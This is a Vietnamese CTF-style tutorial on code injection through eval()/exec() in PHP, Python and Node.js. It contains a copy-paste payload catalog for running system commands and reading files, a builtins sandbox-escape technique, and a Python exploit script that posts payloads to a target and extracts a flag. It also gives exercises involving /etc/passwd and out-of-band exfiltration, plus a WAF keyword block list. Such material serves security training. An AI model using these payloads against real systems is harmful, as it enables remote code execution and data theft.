Code Injection qua eval/exec

Khác với Command Injection (chạy lệnh HỆ ĐIỀU HÀNH) và SSTI (chạy cú pháp TEMPLATE ENGINE), bài này nói về việc app gọi trực tiếp hàm thực thi mã nguồn của chính ngôn ngữ đang chạy (PHP eval(), Python eval()/exec(), Node eval()/ vm, Perl eval) trên dữ liệu người dùng — bạn viết thẳng code ngôn ngữ đó, không cần "thoát" khỏi cú pháp template nào cả.

00 / TÓM TẮT 1 PHÚT

Code Injection là gì?

Nhiều ngôn ngữ có hàm đặc biệt nhận vào 1 CHUỖI TEXT và chạy nó như là code thật của ngôn ngữ đó — PHP eval($code), Python eval(expr)/exec(code), Node.js eval(code). Những hàm này cực kỳ tiện cho dev (tính toán công thức động, "plugin" nhỏ...) nhưng nếu chuỗi đưa vào có lẫn input người dùng, bạn viết thẳng code ngôn ngữ đó để chạy lệnh hệ thống.

Nếu chỉ nhớ một điều Luôn thử payload gây lỗi trước ('"`\ hoặc 1 phép toán sai cú pháp) để xác nhận có eval thật không, rồi mới leo thang lên RCE — đừng nhảy thẳng vào payload phức tạp khi chưa chắc có lỗ hổng.
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ CODE INJECTION (EVAL/EXEC)

✅ Tiền đề cần có Biết (hoặc đoán đúng) ngôn ngữ backend (PHP/Python/Node) để chọn đúng cú pháp payload.
🔍 Dò nhanh Gửi 1+1 → nếu kết quả trả về 2 ⟹ xác nhận có tính toán động (eval-like) thật. Gửi tiếp ");system('id');// (PHP) để kiểm tra có escape được không.

WAF rule nhanh: chặn các từ khoá eval(, exec(, __import__, system(, popen( xuất hiện trong field không nên có code. Chưa hiểu? đọc tiếp dưới.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

eval() — hàm nhận 1 chuỗi, biên dịch và chạy nó NGAY LẬP TỨC như code thật của ngôn ngữ đang chạy, trả về kết quả của biểu thức đó.
exec() (Python) — giống eval() nhưng cho phép chạy cả CÂU LỆNH nhiều dòng (if/for/import...), không chỉ 1 biểu thức, và không trả về giá trị.

Code hay viết (dev nghĩ chỉ dùng cho tính toán công thức số học đơn giản, quên mất người dùng có thể viết bất cứ gì):

// PHP -- "máy tính" tính giá trị công thức
$result = eval("return " . $_GET['formula'] . ";");
# Python -- tương tự
result = eval(request.args.get("formula"))
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Dev tin "chuỗi này chỉ là công thức số học"

Dev nghĩ người dùng chỉ gõ những thứ như 2+2*3, nên dùng eval() cho tiện (thay vì tự viết 1 bộ phân tích công thức an toàn). Nhưng eval() không hề giới hạn — nó chạy được MỌI cú pháp hợp lệ của ngôn ngữ, kể cả gọi hàm hệ thống, import thư viện, đọc file... Không có ranh giới nào giữa "công thức số học" và "code nguy hiểm" trong mắt eval() — với nó, tất cả chỉ là code.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Input của bạn = code thật, không cần "thoát" khỏi đâu cả

Đây là điểm khác biệt quan trọng với SSTI (bài riêng): SSTI phải tìm cách thoát khỏi cú pháp template engine (`{{ }}`, `${ }`...) trước khi chạm được tới code thật. Với eval() trực tiếp, không có lớp template nào ở giữa — chuỗi bạn gửi CHÍNH LÀ code được chạy, không cần "thoát" gì cả.

04 / NHẬN DIỆN KHI GẶP CHALLENGE

Những chức năng hay ẩn eval()

  • Máy tính / công cụ tính biểu thức toán học động.
  • Bộ lọc dữ liệu tùy chỉnh ("custom filter rule", "advanced search query") cho người dùng tự viết điều kiện.
  • Tính năng "preview code" / "playground" chạy đoạn code nhỏ do người dùng nhập (rõ ràng nhất).
  • Tham số cấu hình động đọc từ file/DB rồi "chạy" lại (ít gặp hơn, nhưng nguy hiểm tương tự).

Test nhanh: gửi 1 phép toán hợp lệ (7*7) — nếu trả về 49 đúng, khả năng cao là eval() thật, không phải chỉ parse số đơn giản.

06 / PAYLOAD CATALOG THEO NGÔN NGỮ

Bảng payload copy-dán theo ngôn ngữ backend

A. PHP eval()

");system('id');//
"); — đóng câu lệnh PHP hiện tại (giả định code gốc dạng return ...;)
system('id') — câu lệnh PHP mới, chạy lệnh hệ thống
// — comment, vô hiệu hoá phần code gốc còn lại sau payload
Response: trả ra output của lệnh id trong kết quả trang nếu PHP echo lại giá trị eval trả về.

Biến thể không dùng system (nếu bị chặn từ khóa): passthru('id'), shell_exec('id'), hoặc backtick PHP `id`.

B. Python eval()/exec()

__import__('os').popen('cat flag.txt').read()
__import__('os') — import module os mà không cần cú pháp import (vì eval() chỉ chạy được BIỂU THỨC, không chạy được câu lệnh import)
.popen('cat flag.txt').read() — chạy lệnh shell, đọc toàn bộ output
Response: nội dung file flag.txt nếu giá trị eval() được trả lại cho người dùng.
Nếu app chặn builtinsNhiều app "tự vệ" bằng cách gọi eval(expr, {"__builtins__": {}}) để chặn __import__. Thử bypass bằng cách lấy lại builtins qua chuỗi class cha: ().__class__.__base__.__subclasses__() — tìm 1 class có quyền truy cập file/os trong danh sách subclass trả về (kỹ thuật "sandbox escape", khá nâng cao, không phải lúc nào cũng cần ở Bảng C).

C. Node.js eval()

require('child_process').execSync('cat flag.txt').toString()
require('child_process') — import module chạy lệnh hệ thống của Node
.execSync(...).toString() — chạy lệnh, chuyển kết quả buffer sang chuỗi để trả về
Response: nội dung file flag.txt nếu Node echo lại giá trị eval trả ra.

(B) Bản gọn chắc — trích thẳng flag, thử nhiều payload nếu 1 bị chặn

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
PAYLOADS = [
    "__import__('os').popen('cat flag.txt').read()",
    "().__class__.__base__.__subclasses__()",  # fallback nếu builtins bị chặn (cần soi tay)
]

def exploit_eval(host):
    for p in PAYLOADS:
        r = requests.post(f"http://{host}/calc", data={"formula": p}, timeout=5)
        m = FLAG_RE.search(r.text)
        if m:
            return m.group()
    return None

print("FLAG:", exploit_eval("TARGET_IP"))

(C) Bản A/D tái dùng — chạy vòng quanh mọi đội

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App gọi trực tiếp eval()/exec() của chính ngôn ngữ backend trên dữ liệu người dùng, không qua lớp template engine nào.
❌App dùng template engine (Jinja2, Twig...) để render — đó là SSTI (bài riêng), cách thoát khác, không dùng payload eval() trực tiếp ở đây.
❌App đã dùng thư viện parser công thức an toàn chuyên dụng (vd asteval, mathjs với sandbox đúng cách) — không có eval() thật ở phía dưới.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng 1 Flask app nhỏ có route /calc dùng eval(request.args.get("formula")), tự khai thác lấy nội dung 1 file trên máy.

Gợi ý nếu kẹt__import__('os').popen('cat /etc/passwd').read() rồi truyền qua query string, nhớ URL-encode dấu cách.

⭐⭐ Đổi 1 biến: thêm {"__builtins__": {}} vào app Flask trên, thử lại payload cũ (sẽ lỗi), rồi tìm payload bypass bằng __class__.__base__.__subclasses__().

Gợi ý nếu kẹtIn toàn bộ danh sách subclass ra trước để tìm đúng index của class có thể đọc file (thường là <class 'os._wrap_close'> hoặc tương tự tùy phiên bản Python).

⭐⭐⭐⭐ Tự nghĩ: app chỉ dùng exec() (không trả giá trị, không echo output) để "chạy rule" — không thấy output nào trên response. Thiết kế cách lấy được flag trong tình huống "blind" này.

Gợi ý nếu kẹtDùng payload ghi nội dung flag ra 1 file công khai được (vd thư mục static/ nếu app serve file tĩnh), hoặc dùng kỹ thuật OOB gửi nội dung flag qua HTTP request tới server bạn tự host (xem lại pattern http.server ở các bài XXE/SSRF).

Thuật ngữ

eval()Hàm biên dịch và chạy 1 chuỗi làm code của ngôn ngữ, trả về giá trị biểu thức.
exec()Giống eval() nhưng cho chạy nhiều câu lệnh, không trả giá trị (Python).
Sandbox escapeKỹ thuật vượt qua giới hạn builtins bị chặn để lấy lại quyền truy cập hàm nguy hiểm.

So sánh với các bài liên quan: SSTI (template engine, khác lớp), Command Injection (chạy lệnh OS trực tiếp, không qua ngôn ngữ backend).
